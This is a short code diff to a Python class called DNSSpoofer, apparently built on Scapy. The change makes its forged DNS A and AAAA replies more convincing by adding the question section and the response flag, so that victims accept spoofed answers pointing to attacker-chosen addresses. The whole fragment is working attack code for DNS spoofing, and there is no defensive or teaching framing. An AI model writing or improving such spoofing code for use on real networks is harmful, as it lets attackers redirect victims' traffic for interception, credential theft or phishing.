@@ -61,11 +61,11 @@ class DNSSpoofer:
 
         if recordType == 1:
             # type: A
-            res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip))
+            res_pkt /= DNS(id=req_pkt[DNS].id, qd=DNSQR(qname=name, qtype=recordType), an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip), qr=1)
             print(f'Sending back response to {req_pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip}')
         elif recordType == 28:
             # type: AAAA
-            res_pkt /= DNS(id=req_pkt[DNS].id, an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip6))
+            res_pkt /= DNS(id=req_pkt[DNS].id, qd=DNSQR(qname=name, qtype=recordType), an=DNSRR(rrname=name, type=recordType, ttl=30, rdata=self.new_dns_ip6), qr=1)
             print(f'Sending back response to {req_pkt[IP].src} with {self.recordTypeIdToName(recordType)} record: {self.new_dns_ip6}')
 
 
